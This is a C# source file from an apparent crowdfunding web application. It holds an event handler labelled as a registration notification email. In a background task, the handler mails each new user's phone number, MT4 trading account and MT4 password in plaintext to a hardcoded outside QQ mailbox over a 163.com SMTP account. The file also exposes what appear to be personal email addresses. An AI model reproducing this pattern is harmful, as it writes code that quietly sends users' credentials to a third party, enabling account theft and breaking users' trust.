using Btcamp.Crowdfunding.Core.Entitys;
using Btcamp.Crowdfunding.Core.EventHandler;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Threading.Tasks;
using System.Web;

namespace Btcamp.Crowdfunding.Web
{
    public class CustomRaiseEventConfig
    {
        public static void ReisgerEvent()
        {
            CustomRaiseEvent.AccountRegisterEvent += CustomRaiseEvent_AccountRegisterEvent;
        }

        /// <summary>
        /// 用户注册 发送通知邮件事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        static void CustomRaiseEvent_AccountRegisterEvent(object sender, Account e)
        {
            Task.Factory.StartNew(() =>
            {
                MailMessage mailMessage = new MailMessage(new MailAddress("jiangchun1320@163.com", "蒋春"), new MailAddress("329179439@qq.com", e.PhoneNumber));
                mailMessage.Subject = "用户注册通知";
                mailMessage.Body = e.PhoneNumber + ":" + e.MT4Account + ":" + e.MT4Pwd;
                mailMessage.IsBodyHtml = true;

                SmtpClient client = new SmtpClient("smtp.163.com");
                client.Credentials = new NetworkCredential("jiangchun1320@163.com", "****");
                client.Send(mailMessage);
            });
        }
    }
}